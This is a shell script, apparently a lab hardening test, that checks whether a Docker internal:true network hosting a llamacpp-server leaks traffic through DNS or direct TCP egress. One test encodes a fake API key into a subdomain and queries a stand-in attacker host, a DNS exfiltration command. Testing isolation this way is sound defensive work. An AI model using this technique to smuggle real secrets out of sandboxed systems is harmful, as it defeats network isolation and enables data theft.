# LAB ARTIFACT — fake attack for hardening demonstration only
# Attack 14: DNS Tunneling — Potential Bypass of internal:true Network
#
# Goal: Test whether DNS queries leak through Docker's internal:true network.
#        Docker's embedded DNS (127.0.0.11) may forward queries to the host's
#        DNS resolver, which has internet access. If so, data can be encoded
#        in DNS subdomain labels and exfiltrated to an attacker-controlled
#        authoritative DNS server — even with no IP-level internet route.
#
# NOTE: This tests a REAL potential gap in the internal:true configuration.
#       No data actually leaves the lab — we test resolution only.

set -e

echo "[attack-14] Attempting DNS tunneling / leak test..."

# Test 1: Can we resolve Docker's internal DNS?
echo "[attack-14] Test 1: Docker internal DNS (127.0.0.11)"
cat /etc/resolv.conf 2>/dev/null || true

# Test 2: Can we resolve the llamacpp-server hostname? (should work)
echo "[attack-14] Test 2: Internal hostname resolution"
getent hosts llamacpp-server 2>&1 || nslookup llamacpp-server 2>&1 || echo "[attack-14] Internal DNS failed"

# Test 3: Can we resolve an EXTERNAL hostname? (should FAIL on internal:true)
echo "[attack-14] Test 3: External hostname resolution (should fail)"
getent hosts example.com 2>&1 || nslookup example.com 2>&1 || echo "[attack-14] External DNS blocked (good)"

# Test 4: Can we reach Docker's embedded DNS directly?
echo "[attack-14] Test 4: Direct query to Docker DNS (127.0.0.11)"
nslookup google.com 127.0.0.11 2>&1 || echo "[attack-14] Direct DNS query blocked"

# Test 5: Simulated DNS exfil — encode fake secret in subdomain
FAKE_SECRET="FAKE-API-KEY-k9x7m2p4"
ENCODED=$(echo "$FAKE_SECRET" | od -A n -t x1 | tr -d ' \n' | head -c 60)
echo "[attack-14] Test 5: DNS-encoded exfil attempt"
echo "[attack-14]   Encoded secret: ${ENCODED}"
nslookup "${ENCODED}.exfil.attacker.example" 2>&1 \
    || echo "[attack-14] DNS exfil query failed (no external resolution)"

# Test 6: Attempt TCP connection to external host (should fail)
echo "[attack-14] Test 6: Direct TCP egress test"
curl -s --connect-timeout 3 http://example.com 2>&1 \
    || echo "[attack-14] TCP egress blocked (internal:true working)"

# Test 7: Can we reach the host gateway?
echo "[attack-14] Test 7: Host gateway reachability"
GATEWAY=$(ip route 2>/dev/null | grep default | awk '{print $3}')
if [ -n "$GATEWAY" ]; then
    echo "[attack-14]   Default gateway: $GATEWAY"
    curl -s --connect-timeout 3 "http://$GATEWAY" 2>&1 \
        || echo "[attack-14]   Gateway unreachable (good)"
else
    echo "[attack-14]   No default gateway (internal:true confirmed)"
fi

echo "[attack-14] Attack attempts complete."
